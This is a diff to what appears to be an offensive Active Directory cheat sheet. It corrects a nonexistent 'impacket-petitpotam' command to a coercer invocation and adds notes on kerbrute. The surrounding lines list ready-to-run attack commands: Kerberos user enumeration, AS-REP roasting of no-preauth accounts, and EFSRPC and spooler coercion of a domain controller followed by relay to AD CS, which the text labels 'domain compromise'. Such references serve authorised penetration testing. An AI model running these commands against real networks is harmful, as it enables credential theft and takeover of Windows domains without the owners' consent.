@@ -206,6 +206,8 @@ nmap -p88 --open --script=krb5-enum-users -Pn -oA Kerberos <ip_address>
 
 # User enum (no creds) + AS-REP roast (no-preauth accounts):
 # UPSTREAM: kerbrute not in apt (see install/offensive-packages.txt); nxc ldap --asreproast covers this too
+# NOTE: kerbrute upstream is FROZEN (last release v1.0.3, Dec 2019). Kept for the stealthy
+# pre-auth spray that aborts before the password stage; nxc covers userenum/asreproast.
 kerbrute userenum -d <domain> --dc <ip_address> /usr/share/seclists/Usernames/Names/names.txt
 # companion:gen asreproast-getnpusers
 impacket-GetNPUsers <domain>/ -dc-ip <ip_address> -usersfile users.txt -no-pass
@@ -390,7 +392,9 @@ proxychains nxc smb <ip_address>                                   # ride the re
 Coercion -> relay -> domain compromise
 ++++++++++++++++++++++++++++++++++++++++
 # Force a machine (ideally a DC) to auth to you, then relay it:
-impacket-petitpotam <your-ip> <dc-ip>                       # MS-EFSRPC (EfsRpcOpenFileRaw)
+coercer coerce -t <dc-ip> -l <your-ip> -u <user> -p <password> -d <domain> --filter-method-name Efs   # MS-EFSRPC (PetitPotam)
+# UPSTREAM: there is no `impacket-petitpotam` — PetitPotam is topotam/PetitPotam, not an
+# impacket-scripts script. coercer is the apt-native trigger and covers the EFSRPC vector.
 printerbug <domain>/<user>:<password>@<dc-ip> <your-ip>     # MS-RPRN spooler (Dementor); apt `krbrelayx` installs it as `printerbug` (no .py). coercer (below) is the apt-native multi-vector alt
 coercer coerce -t <dc-ip> -l <your-ip> -u <user> -p <password> -d <domain>   # many vectors
 # Relay coerced DC auth to AD CS web enrollment -> DC cert (dirkjanm relay-to-ADCS):
